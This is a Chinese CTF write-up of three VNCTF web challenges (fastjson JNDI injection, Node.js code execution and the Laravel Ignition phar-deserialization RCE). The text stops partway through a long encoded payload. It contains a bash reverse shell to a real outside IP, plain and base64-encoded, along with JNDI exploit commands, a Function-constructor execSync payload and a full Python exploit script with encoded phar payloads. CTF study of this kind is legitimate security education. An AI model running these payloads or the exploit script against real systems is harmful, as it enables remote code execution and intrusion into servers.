

# VNCTF(web)详解

看了下师傅们的wp，发现还挺难理解的。下面跟着大家做个简单的解答。

## 0x01 realezjvav

一上来就是常规的登录框，估摸着就是sql注入，paylod一拿到，一打，欸，不错，**笛卡尔乘积**盲注（原理：多个数据表链接的时候，数据大了，所以时间长）拿到密码`no_0ne_kn0w_th1s`

![image-20210316081648290](https://i.loli.net/2021/03/16/zdci9sYPGOrDyUQ.png)

然后是这个，看不出来，我们继续。

![image-20210316081711595](https://i.loli.net/2021/03/16/A5NpaUZnOxuRwXm.png)

发现这个就是我们fastjson，rce了。

https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/README-CN.md

https://github.com/vulhub/vulhub/tree/master/fastjson/1.2.47-rce

```
/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/42.192.142.64/9009 0>&1
```

```
rmi://ip/cghvrc
bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzQyLjE5Mi4xNDIuNjQvOTAwOSAwPiYxCg==}|{base64,-d}|{bash,-i}
```

![image-20210316090601419](https://i.loli.net/2021/03/16/2lKWTIiDUBV3drP.png)

![image-20210316090620922](https://i.loli.net/2021/03/16/3pFic1nZJeHQ7Lx.png)

```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzQyLjE5Mi4xNDIuNjQvOTAwOSAwPiYxCg==}|{base64,-d}|{bash,-i}" -A " 42.192.142.64"
```

这样就能够打通了。这里注意多打几次还有就是命令的传输时，记得多骚一下。（这个payload命令记得骚一下）

## 0x02 naive

https://segmentfault.com/a/1190000016565228?utm_source=tag-newest

拿到key`yoshino-s_want_a_gf,qq1735439536`

这样我们就能够代码执行了。

这里就是一个nodejs题目中代码执行常用小点。

#### 拿到Function构造匿名函数代码执行

`(1).constructor.constructor`测试之后这个可以完美找到这个匿名函数，然后我们开始找想要执行的代码

![image-20210316145732986](https://i.loli.net/2021/03/16/nXVMgzq6CW2o7aT.png)

注意看到type的那一行，我们可以知道这是一个EC6模块

![image-20210316145818598](https://i.loli.net/2021/03/16/1v6AIebBC5V9zEP.png)

不支持什么require()等方式的代码引入，不能达到目标，要用动态的执行了。https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Modules

就只能使用import来构造了代码执行了。

```
import('/modules/myModule.mjs')
  .then((module) => {
    // Do something with the module.
  });
```

```
(1).constructor.constructor("import('child_process').then((module) =>{module.execSync(\"whoami").toString();});")
```

![image-20210316150955349](https://i.loli.net/2021/03/16/SdU374OfDVNwMXZ.png)

代码执行成功。

读flag把flag写道tmp目录下，然后用任意文件读取即可。

#### global.process.binding导出任意模块

https://tipi-hack.github.io/2019/04/14/breizh-jail-calc2.html

## 0x03 Easy_laravel

记录一下环境复现有多坑爹（大家好，我是安装环境时长两天半的ctfer，最擅长删除，重装）

```
git clone 克隆下来
git check 选择你要哪个版本
然后 重点来了。
```

![image-20210320092013403](https://i.loli.net/2021/03/20/nITWwF1edEuLH46.png)

然后，重点2，这里使用，不要用update,辣鸡会忽略版本。这是已经配置好的json配置，替换掉`composer.json`即可

```
{
    "name": "laravel/laravel",
    "type": "project",
    "description": "The Laravel Framework.",
    "keywords": [
        "framework",
        "laravel"
    ],
    "license": "MIT",
    "require": {
        "php": "^7.3|^8.0",
        "fideloper/proxy": "^4.4",
        "fruitcake/laravel-cors": "^2.0",
        "guzzlehttp/guzzle": "^7.0.1",
        "laravel/framework": "v8.22.1",
        "laravel/tinker": "^2.5"
    },
    "require-dev": {
        "facade/ignition": "2.5.1",
        "fakerphp/faker": "^1.9.1",
        "mockery/mockery": "^1.4.2",
        "nunomaduro/collision": "^5.0",
        "phpunit/phpunit": "^9.3.3"
    },
    "config": {
        "optimize-autoloader": true,
        "preferred-install": "dist",
        "sort-packages": true
    },
    "extra": {
        "laravel": {
            "dont-discover": []
        }
    },
    "autoload": {
        "psr-4": {
            "App\\": "app/",
            "Database\\Factories\\": "database/factories/",
            "Database\\Seeders\\": "database/seeders/"
        }
    },
    "autoload-dev": {
        "psr-4": {
            "Tests\\": "tests/"
        }
    },
    "minimum-stability": "dev",
    "prefer-stable": true,
    "scripts": {
        "post-autoload-dump": [
            "Illuminate\\Foundation\\ComposerScripts::postAutoloadDump",
            "@php artisan package:discover --ansi"
        ],
        "post-root-package-install": [
            "@php -r \"file_exists('.env') || copy('.env.example', '.env');\""
        ],
        "post-create-project-cmd": [
            "@php artisan key:generate --ansi"
        ]
    }
}
```

然后坐下来，更新一下源，然后喝口水，成功。

现在其实配置 `php artisan serve`，这样就可以完成操作了。

`php artisan key:generate`然后`php artisan key:generate`生成key

**但是**，现在只是完成了第一层，也就是我们常说的，你根本只能看到我，却不能够运行我。呜呜呜

下面,我们来继续进行操作,配置apache环境,来进行debug,各种复制,粘贴换成之后,大概是这个样子的.

![image-20210320092854683](https://i.loli.net/2021/03/20/8zgufrKPSHqXjEw.png)

![image-20210320100046046](https://i.loli.net/2021/03/20/IwVxpCYdJcoPXue.png)

然后,就可以访问了。

然后开始漏洞的分析之路。

![image-20210320160259513](https://i.loli.net/2021/03/20/Mdi8CrQHaKX2mUl.png)

这几个solution就是ignition提供给我们可以通过按钮来实现解决报错的按钮。下面我们来看一下控制器对他们的执行。

![image-20210320160902432](https://i.loli.net/2021/03/20/OZFynRg5Ip6XDwb.png)

调用run方法，并且传入parameters参数。

![image-20210320161253059](https://i.loli.net/2021/03/20/Wz8D1Sx4hjVTAgF.png)

这里面的run方法实现的内容大概是

```
读取viewfile参数的内容，然后进行替换。然后再写会文件中。
```

这里的file_get_contents参数可控，所以可以利用`phar://`协议来实现反序列化利用。如果现在有一个文件上传接口，那么这道题到这里就结束。

这里可以去phpggc中那一条已经存在的链子开始打了。(可惜这个题目已经把这条链子给封杀了哈哈)

```
php -d'phar.readonly=0' ./phpggc monolog/rce1 system id --phar phar -o phar.log
```

**下面开始分析这个新的CVE到底新在哪里？**

**log转phar**:

首先我们来看看正常的log文件:

![image-20210320162759564](https://i.loli.net/2021/03/20/Gz6H1e4PK23UdbQ.png)

####  Log文件

这里说一下: 因为我们会用到`utf-16le->utf-8`，所以我们必须保证我们前面payload的位置必须是偶数这样才能完美的转换，具体的原因就是utf-16le对于utf-8的配置，这也是在前面写payload的时候需要在前后加头来调节偏移的原因。

我们来分析一下这两种的编码方式

![image-20210704001940627](https://i.loli.net/2021/07/04/NoMxcOav9ULW6Tw.png)

先来看  我们知道1的ascii编码是`"31"`所以utf-8就是`0x31`,但是utf-16是16位的所以，他就变成了`0x0031`,前面的`feff`，是加在前面的头部。

所以注意： 这里我们在最后的拼接的时候也才能够很顺利地变成想要的样子。奇数和偶数之间的转换问题罢了。

**清空log文件**：

文章中作者使用了`php://filter`的`convert.base64-decode的特性，它在进行base64解密的时候，会先将不是base64字符的部分去除，然后再进行解码.

![image-20210320163312425](https://i.loli.net/2021/03/20/gKkG72Zuypsx5iD.png)

这样，我们就可以多次调用这个小玩意，将这个玩意去除

![image-20210320163416964](https://i.loli.net/2021/03/20/xgPWKQ7rZLoebn2.png)

但是这样做会出现非预期

当base64的“==”后面有字母的时候，那么php会报出warning，但是且由于laravel开启了debug模式，所以会触发`Ignition`生成错误页面，导致decode后的字符没有成功写入。这样，清空日志应该分成两部分

```
1. 将log全部转换为非base64
2. 通过convert.base64-decode将日志文件清空
```

进而转换为

```
1.convert.iconv.utf-8.utf-16
2.convert.quoted-printable-encode 打印不可见字符，并且不会使他们报一些奇怪的错误
3.convert.iconv.utf-16be.utf-8 再转换回来就全不可见了
4.convert.base64-decode
php://filter/read=convert.base64-encode/resource=/flag
```

```
php://filter/write=convert.iconv.utf-8.utf-16|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log
```

![image-20210322231746692](https://i.loli.net/2021/03/22/GcHnvsJry419ZBk.png)

这样我们就成功清楚了这里设置，下面我们继续一步的操作.我们已经达到了清空log的操作要求.

现在就该去写入符合我们规范的log文件,让他变成我们的小乖乖.

![image-20210322232240002](https://i.loli.net/2021/03/22/oQMqGRx6D5btKY9.png)

这让我们怎么写.

```
log格式
[时间] [某些字符] PAYLOAD [某些字符] PAYLOAD [某些字符] 部分PAYLOAD [某些字符]
```

也就是说我们还得利用上面的方法来来清洗log,但是这里我们会出现两个payload,

![image-20210322234928167](https://i.loli.net/2021/03/22/QOZMy7ohvmPwVlW.png)

这是我们不希望看到的,所以,我们来重新进行操作.在后面加上字符,让其中总有一个能解析出来就行了`.\0a``\00`

![image-20210322235332128](https://i.loli.net/2021/03/23/I9xmpNgKdfLojEC.png)但是file_get_contents()在传入这些字符的时候会报错,但好在我们还有过滤器可以使用.`convert.quoted-printable-encode`原来是先转为ascii字符,然后在后面加上等号。

![image-20210322235443704](https://i.loli.net/2021/03/23/1zghU53aBVMwntq.png)

现在读入的指令为

```
php://filter/read=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=test.txt
```

还有注意 这个最后的过滤器会匹配等号，如果没有匹配到就报错，所以我们要转换等号为`=3d`可以看到这里，在最后面的`=`号后的ascii字符被省略了，导致`convert.quoted-printable-decode`过滤器再次报错，所以我们可以把第一个字符`P`转成对应的`=50`，从而让这里的`=`号都能匹配上

干脆我们将payload先进行过滤器处理。

**写入**

```
php://filter/write=convert.iconv.utf-8.utf-16|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log
```

写入前缀

```
AA
```

![image-20210323000112011](https://i.loli.net/2021/03/23/7xPuSQpgvi1c4JR.png)

```
#! -*- coding:utf-8 -*-
import sys
import requests
import re
class Poc:
    def clear_log(self,schema, host, port):
        base_url = "{}://{}:{}".format(schema, host, port)
        path="/_ignition/execute-solution"
        req_url="{}{}".format(base_url,path)
        payload='''
{
  "solution": "Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution",
  "parameters": {
    "variableName": "username",
    "viewFile": "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
  }
}
        '''
        _headers ={
            "Content-Type":"application/json"
        }
        resp = requests.post(req_url,data=payload, headers=_headers, allow_redirects=False)
        return resp.status_code
    def add_prefix(self,schema, host, port):
        base_url = "{}://{}:{}".format(schema, host, port)
        path = "/_ignition/execute-solution"
        req_url = "{}{}".format(base_url, path)
        payload = '''
        {
          "solution": "Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution",
          "parameters": {
            "variableName": "username",
            "viewFile": "AA"
          }
        }
                '''
        _headers ={
            "Content-Type": "application/json"
        }
        resp = requests.post(req_url, data=payload, headers=_headers, allow_redirects=False)
        return resp.text
    def send_payload(self,schema, host, port):
        base_url = "{}://{}:{}".format(schema, host, port)
        path = "/_ignition/execute-solution"
        req_url = "{}{}".format(base_url, path)
        payload = '''
{
  "solution": "Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution",
  "parameters": {
    "variableName": "username",
    "viewFile": "=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=71=00=39=00=41=00=67=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=42=00=6D=00=41=00=67=00=41=00=41=00=54=00=7A=00=6F=00=7A=00=4D=00=6A=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=46=00=4E=00=35=00=63=00=32=00=78=00=76=00=5A=00=31=00=56=00=6B=00=63=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4F=00=54=00=6F=00=69=00=41=00=43=00=6F=00=41=00=63=00=32=00=39=00=6A=00=61=00=32=00=56=00=30=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=49=00=35=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=35=00=76=00=62=00=47=00=39=00=6E=00=58=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=4A=00=63=00=51=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=53=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=36=00=4E=00=7A=00=70=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=37=00=54=00=7A=00=6F=00=79=00=4F=00=54=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=45=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=63=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=41=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=55=00=32=00=6C=00=36=00=5A=00=53=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=6B=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=69=00=49=00=37=00=59=00=54=00=6F=00=78=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=59=00=54=00=6F=00=79=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=63=00=7A=00=6F=00=79=00=4F=00=69=00=4A=00=70=00=5A=00=43=00=49=00=37=00=63=00=7A=00=6F=00=31=00=4F=00=69=00=4A=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=62=00=47=00=56=00=32=00=5A=00=57=00=77=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4E=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=68=00=62=00=47=00=6C=00=36=00=5A=00=57=00=51=00=69=00=4F=00=32=00=49=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=4A=00=4D=00=61=00=57=00=31=00=70=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=7A=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=77=00=63=00=6D=00=39=00=6A=00=5A=00=58=00=4E=00=7A=00=62=00=33=00=4A=00=7A=00=49=00=6A=00=74=00=68=00=4F=00=6A=00=49=00=36=00=65=00=32=00=6B=00=36=00=4D=00=44=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=6D=00=4E=00=31=00=63=00=6E=00=4A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=32=00=6B=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=59=00=36=00=49=00=6E=00=4E=00=35=00=63=00=33=00=52=00=6C=00=62=00=53=00=49=00=37=00=66=00=58=00=31=00=7A=00=4F=00=6A=00=45=00=7A=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=4A=00=54=00=61=00=58=00=70=00=6C=00=49=00=6A=00=74=00=70=00=4F=00=69=00=30=00=78=00=4F=00=33=00=4D=00=36=00=4F=00=54=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=49=00=6A=00=74=00=68=00=4F=00=6A=00=45=00=36=00=65=00=32=00=6B=00=36=00=4D=00=44=00=74=00=68=00=4F=00=6A=00=49=00=36=00=65=00=32=00=6B=00=36=00=4D=00=44=00=74=00=7A=00=4F=00=6A=00=49=00=36=00=49=00=6D=00=6C=00=6B=00=49=00=6A=00=74=00=7A=00=4F=00=6A=00=55=00=36=00=49=00=6D=00=78=00=6C=00=64=00=6D=00=56=00=73=00=49=00=6A=00=74=00=4F=00=4F=00=33=00=31=00=39=00=63=00=7A=00=6F=00=34=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=70=00=62=00=6D=00=6C=00=30=00=61=00=57=00=46=00=73=00=61=00=58=00=70=00=6C=00=5A=00=43=00=49=00=37=00=59=00=6A=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=51=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=78=00=70=00=62=00=57=00=6C=00=30=00=49=00=6A=00=74=00=70=00=4F=00=69=00=30=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=4D=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=42=00=79=00=62=00=32=00=4E=00=6C=00=63=00=33=00=4E=00=76=00=63=00=6E=00=4D=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=33=00=56=00=79=00=63=00=6D=00=56=00=75=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4E=00=6A=00=6F=00=69=00=63=00=33=00=6C=00=7A=00=64=00=47=00=56=00=74=00=49=00=6A=00=74=00=39=00=66=00=58=00=30=00=46=00=41=00=41=00=41=00=41=00=5A=00=48=00=56=00=74=00=62=00=58=00=6B=00=45=00=41=00=41=00=41=00=41=00=47=00=47=00=63=00=49=00=59=00=41=00=51=00=41=00=41=00=41=00=41=00=4D=00=66=00=6E=00=2F=00=59=00=70=00=41=00=45=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=49=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=43=00=35=00=30=00=65=00=48=00=51=00=45=00=41=00=41=00=41=00=41=00=47=00=47=00=63=00=49=00=59=00=41=00=51=00=41=00=41=00=41=00=41=00=4D=00=66=00=6E=00=2F=00=59=00=70=00=41=00=45=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=42=00=30=00=5A=00=58=00=4E=00=30=00=64=00=47=00=56=00=7A=00=64=00=46=00=75=00=79=00=53=00=68=00=78=00=45=00=4F=00=52=00=4C=00=32=00=32=00=52=00=68=00=4D=00=5A=00=47=00=4A=00=66=00=69=00=32=00=6F=00=6A=00=4F=00=4E=00=33=00=33=00=41=00=67=00=41=00=41=00=41=00=45=00=64=00=43=00=54=00=55=00=49=00=3D=00a"
  }
}
        '''
        _headers = {
            "Content-Type": "application/json"
        }
        resp = requests.post(req_url, data=payload, headers=_headers, allow_redirects=False)
        return resp.text
    def restore_payload(self,schema, host, port):
        base_url = "{}://{}:{}".format(schema, host, port)
        path = "/_ignition/execute-solution"
        req_url = "{}{}".format(base_url, path)
        payload ='''
{
  "solution": "Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution",
  "parameters": {
    "variableName": "username",
    "viewFile": "php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
  }
}
'''
        _headers = {
            "Content-Type": "application/json"
        }
        resp = requests.post(req_url, data=payload, headers=_headers, allow_redirects=False)
        return resp.status_code
    def phar_unserialize(self,schema, host, port):
        base_url = "{}://{}:{}".format(schema, host, port)
        path = "/_ignition/execute-solution"
        req_url = "{}{}".format(base_url, path)
        payload = '''
{
  "solution": "Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution",
  "parameters": {
    "variableName": "username",
    "viewFile": "phar:///var/www/storage/logs/laravel.log/test.txt"
  }
}
        '''
        _headers = {
            "Content-Type": "application/json"
        }
        resp = requests.post(req_url, data=payload, headers=_headers, allow_redirects=False)
        return resp.text
    def crack(self, schema, host, port):
        for i in range(3):
            if self.clear_log(schema, host, port)==200:
                print("laravel log cleard")
                self.add_prefix(schema, host, port)
                self.send_payload(schema, host, port)
                if self.restore_payload(schema, host, port)==200:
                    print("successfully converted to phar")
                    resp_text=self.phar_unserialize(schema, host, port)
                    if "uid=" in resp_text and "gid=" in resp_text:
                        print("phar unserialize")
                        print(resp_text.split("\n")[-2])
                        break
                else:
                    print("converted to phar fails")
            else:
                print("laravel log clear fails")

if __name__ == "__main__":
    poc = Poc()
    poc.crack(sys.argv[1], sys.argv[2], sys.argv[3])
```

附上利用脚本。

####  题目开始

生成phar链条

```
{
  "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
  "parameters": {
    "variableName": "username",
    "viewFile": "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
  }
}
```

```
{
  "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
  "parameters": {
    "variableName": "username",
    "viewFile": "AA"
  }
}
```

```
{
  "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
  "parameters": {
    "variableName": "username",
    "viewFile":"=52=00=30=00=6C=00=47=00=4F=00=44=00=6C=00=68=00=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=72=00=6E=00=42=00=67=00=41=00=41=00=41=00=51=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=43=00=78=00=42=00=67=00=41=00=41=00=54=00=7A=00=6F=00=32=00=4E=00=44=00=6F=00=69=00=55=00=33=00=6C=00=74=00=5A=00=6D=00=39=00=75=00=65=00=56=00=78=00=44=00=62=00=32=00=31=00=77=00=62=00=32=00=35=00=6C=00=62=00=6E=00=52=00=63=00=55=00=6D=00=39=00=31=00=64=00=47=00=6C=00=75=00=5A=00=31=00=78=00=4D=00=62=00=32=00=46=00=6B=00=5A=00=58=00=4A=00=63=00=51=00=32=00=39=00=75=00=5A=00=6D=00=6C=00=6E=00=64=00=58=00=4A=00=68=00=64=00=47=00=39=00=79=00=58=00=45=00=6C=00=74=00=63=00=47=00=39=00=79=00=64=00=45=00=4E=00=76=00=62=00=6D=00=5A=00=70=00=5A=00=33=00=56=00=79=00=59=00=58=00=52=00=76=00=63=00=69=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=33=00=4D=00=6A=00=6F=00=69=00=41=00=46=00=4E=00=35=00=62=00=57=00=5A=00=76=00=62=00=6E=00=6C=00=63=00=51=00=32=00=39=00=74=00=63=00=47=00=39=00=75=00=5A=00=57=00=35=00=30=00=58=00=46=00=4A=00=76=00=64=00=58=00=52=00=70=00=62=00=6D=00=64=00=63=00=54=00=47=00=39=00=68=00=5A=00=47=00=56=00=79=00=58=00=45=00=4E=00=76=00=62=00=6D=00=5A=00=70=00=5A=00=33=00=56=00=79=00=59=00=58=00=52=00=76=00=63=00=6C=00=78=00=4A=00=62=00=58=00=42=00=76=00=63=00=6E=00=52=00=44=00=62=00=32=00=35=00=6D=00=61=00=57=00=64=00=31=00=63=00=6D=00=46=00=30=00=62=00=33=00=49=00=41=00=63=00=47=00=46=00=79=00=5A=00=57=00=35=00=30=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=49=00=32=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=4E=00=72=00=5A=00=58=00=4A=00=35=00=58=00=45=00=68=00=70=00=5A=00=32=00=68=00=6C=00=63=00=6B=00=39=00=79=00=5A=00=47=00=56=00=79=00=54=00=57=00=56=00=7A=00=63=00=32=00=46=00=6E=00=5A=00=53=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=7A=00=4D=00=6A=00=6F=00=69=00=41=00=45=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=53=00=47=00=6C=00=6E=00=61=00=47=00=56=00=79=00=54=00=33=00=4A=00=6B=00=5A=00=58=00=4A=00=4E=00=5A=00=58=00=4E=00=7A=00=59=00=57=00=64=00=6C=00=41=00=47=00=31=00=76=00=59=00=32=00=73=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=67=00=36=00=49=00=6C=00=42=00=49=00=55=00=46=00=56=00=75=00=61=00=58=00=52=00=63=00=52=00=6E=00=4A=00=68=00=62=00=57=00=56=00=33=00=62=00=33=00=4A=00=72=00=58=00=45=00=31=00=76=00=59=00=32=00=74=00=50=00=59=00=6D=00=70=00=6C=00=59=00=33=00=52=00=63=00=54=00=57=00=39=00=6A=00=61=00=31=00=52=00=79=00=59=00=57=00=6C=00=30=00=49=00=6A=00=6F=00=79=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=51=00=35=00=4F=00=69=00=49=00=41=00=55=00=45=00=68=00=51=00=56=00=57=00=35=00=70=00=64=00=46=00=78=00=47=00=63=00=6D=00=46=00=74=00=5A=00=58=00=64=00=76=00=63=00=6D=00=74=00=63=00=54=00=57=00=39=00=6A=00=61=00=30=00=39=00=69=00=61=00=6D=00=56=00=6A=00=64=00=46=00=78=00=4E=00=62=00=32=00=4E=00=72=00=56=00=48=00=4A=00=68=00=61=00=58=00=51=00=41=00=59=00=32=00=78=00=68=00=63=00=33=00=4E=00=44=00=62=00=32=00=52=00=6C=00=49=00=6A=00=74=00=7A=00=4F=00=6A=00=45=00=78=00=4D=00=7A=00=67=00=36=00=49=00=6D=00=56=00=6A=00=61=00=47=00=38=00=67=00=4A=00=31=00=4E=00=6C=00=5A=00=53=00=42=00=35=00=62=00=33=00=55=00=67=00=61=00=57=00=34=00=67=00=64=00=47=00=68=00=6C=00=49=00=46=00=56=00=75=00=63=00=32=00=56=00=79=00=61=00=57=00=46=00=73=00=61=00=58=00=70=00=6C=00=49=00=53=00=63=00=37=00=49=00=47=00=5A=00=70=00=62=00=47=00=56=00=66=00=63=00=48=00=56=00=30=00=58=00=32=00=4E=00=76=00=62=00=6E=00=52=00=6C=00=62=00=6E=00=52=00=7A=00=4B=00=43=00=63=00=76=00=64=00=6D=00=46=00=79=00=4C=00=33=00=64=00=33=00=64=00=79=00=39=00=6F=00=64=00=47=00=31=00=73=00=4C=00=33=00=4E=00=30=00=62=00=33=00=4A=00=68=00=5A=00=32=00=55=00=76=00=62=00=47=00=39=00=6E=00=63=00=79=00=39=00=6F=00=4D=00=33=00=67=00=75=00=62=00=47=00=39=00=6E=00=4A=00=79=00=78=00=69=00=59=00=58=00=4E=00=6C=00=4E=00=6A=00=52=00=66=00=5A=00=47=00=56=00=6A=00=62=00=32=00=52=00=6C=00=4B=00=43=00=64=00=53=00=4D=00=47=00=78=00=48=00=54=00=30=00=52=00=73=00=61=00=46=00=42=00=45=00=4F=00=58=00=64=00=68=00=53=00=45=00=46=00=6E=00=57=00=44=00=45=00=35=00=53=00=56=00=46=00=56=00=65=00=46=00=56=00=59=00=4D=00=45=00=35=00=51=00=56=00=46=00=5A=00=43=00=53=00=6C=00=52=00=46=00=56=00=6C=00=4E=00=4C=00=51=00=32=00=73=00=33=00=53=00=55=00=51=00=34=00=4B=00=30=00=52=00=52=00=63=00=54=00=64=00=42=00=5A=00=30=00=46=00=42=00=51=00=56=00=46=00=42=00=51=00=55=00=46=00=43=00=52=00=55=00=46=00=42=00=51=00=55=00=46=00=43=00=51=00=55=00=46=00=42=00=51=00=55=00=46=00=42=00=51=00=30=00=5A=00=42=00=5A=00=30=00=46=00=42=00=56=00=48=00=70=00=76=00=4D=00=6B=00=35=00=45=00=62=00=32=00=6C=00=56=00=4D=00=32=00=78=00=30=00=57=00=6D=00=30=00=35=00=64=00=57=00=56=00=57=00=65=00=45=00=52=00=69=00=4D=00=6A=00=46=00=33=00=59=00=6A=00=49=00=31=00=62=00=47=00=4A=00=75=00=55=00=6D=00=4E=00=56=00=62=00=54=00=6B=00=78=00=5A=00=45=00=64=00=73=00=64=00=56=00=6F=00=78=00=65=00=45=00=31=00=69=00=4D=00=6B=00=5A=00=72=00=57=00=6C=00=68=00=4B=00=59=00=31=00=45=00=79=00=4F=00=58=00=56=00=61=00=62=00=57=00=78=00=75=00=5A=00=46=00=68=00=4B=00=61=00=47=00=52=00=48=00=4F=00=58=00=6C=00=59=00=52=00=